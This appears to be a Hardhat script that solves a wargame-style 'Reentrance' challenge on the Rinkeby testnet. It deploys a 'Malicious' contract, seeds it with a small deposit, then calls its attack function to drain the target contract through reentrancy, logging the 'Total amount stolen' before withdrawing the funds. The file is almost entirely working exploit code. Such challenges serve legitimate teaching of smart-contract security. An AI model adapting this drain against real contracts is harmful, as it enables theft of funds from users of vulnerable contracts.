/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk');
const { ethers } = require('hardhat');
const { deployed } = require('./deployed')
const INSTANCE = "0x79aD2101b4b20Aafb4593aff3FBdF94bF9899011"
const MALICIOUS = "0x898Ce615F19F65D79c9c8f5F5e203A57761d6Ee5"


async function instanceState(deployer, malicious, rinkeby) {
  const index = ethers.utils.zeroPad(0, 32)
  const key = ethers.utils.zeroPad(malicious.address, 32)
  const newKey = ethers.utils.concat([key, index])
  let hashKey = ethers.utils.keccak256(newKey)
  const index1 = ethers.utils.zeroPad(1, 32)
  const key1 = ethers.utils.zeroPad(malicious.address, 32)
  const newKey1 = ethers.utils.concat([key1, index1])
  let hashKey1 = ethers.utils.keccak256(newKey1)

  const index2 = ethers.utils.zeroPad(0, 32)
  const key2 = ethers.utils.zeroPad(deployer.address, 32)
  const newKey2 = ethers.utils.concat([key2, index2])
  let hashKey2 = ethers.utils.keccak256(newKey2)
  const index3 = ethers.utils.zeroPad(1, 32)
  const key3 = ethers.utils.zeroPad(deployer.address, 32)
  const newKey3 = ethers.utils.concat([key3, index3])
  let hashKey3 = ethers.utils.keccak256(newKey3)

  console.log('                          INSTANCE STATE')
  console.log("Storage '0' malicious balance", await rinkeby.getStorageAt(INSTANCE, hashKey))
  console.log("Storage '1' malicious balance", await rinkeby.getStorageAt(INSTANCE, hashKey1))
  console.log("Storage '0' deployer balance", await rinkeby.getStorageAt(INSTANCE, hashKey2))
  console.log("Storage '1' deployer balance", await rinkeby.getStorageAt(INSTANCE, hashKey3))
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  
  let Reentrance = await hre.ethers.getContractFactory('Reentrance')
  let reentrance = await Reentrance.attach(INSTANCE)
  
  const Malicious = await hre.ethers.getContractFactory('Malicious')
  const malicious = await Malicious.deploy(reentrance.address)
  await malicious.deployed()
  
  await deployed('Malicious', hre.network.name, malicious.address)
  
  await instanceState(deployer, malicious, rinkeby)

  let balanceToRug = await rinkeby.getBalance(reentrance.address)
  let fundDeposited = ethers.utils.parseEther('0.0001')
  console.log("Balance of Reentrance.sol: ", ethers.utils.formatEther(balanceToRug.toString()), 'ETH')
  
  
  // STEP 1
  // Deposit a little to performe the next step
  console.log("Deposit a little to performe the next step...")
  let estimateGas = await malicious.estimateGas.donateTo({value: ethers.utils.parseEther('0.0001')})
  console.log("Estimate gas needed for malicious.donateTo", ethers.utils.formatEther(estimateGas.toString()))
 
  const tx = await malicious.donateTo({gasLimit: estimateGas * 10, value: ethers.utils.parseEther('0.0001')})
  await tx.wait()
  console.log("transaction confirmed !")

  await instanceState(deployer, malicious, rinkeby)

  console.log("Transaction valided !\n")
  // STEP2
  // Rug the contract !!!...
  estimateGas = await malicious.estimateGas.attack()
  console.log("Estimate gas needed", ethers.utils.formatEther(estimateGas.toString()))

  console.log("Rug the contract !!!...")
  const tx2 = await malicious.attack({gasLimit: (estimateGas * (balanceToRug / fundDeposited)) * 2})
  const receipt = await tx2.wait()
  console.log("transaction confirmed !")
  console.log(ethers.utils.formatEther(receipt.gasUsed.toString()))

  await instanceState(deployer, malicious, rinkeby)
  
  console.log("You win !")
  let maliciousBalance =  await rinkeby.getBalance(malicious.address)
  balanceToRug = await rinkeby.getBalance(reentrance.address)
  console.log("Total amount stolen: ", ethers.utils.formatEther(maliciousBalance.toString()) - fundDeposited, '\n')
  console.log("Total amount remaining in Reentrance contract: ", ethers.utils.formatEther(balanceToRug.toString()), '\n')
  
  await instanceState(deployer, malicious, rinkeby)

  // STEP 3
  // get back the money
  console.log("Get the money back...")
  const tx3 = await malicious.withdraw()
  await tx3.wait()
  console.log("transaction confirmed !")
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
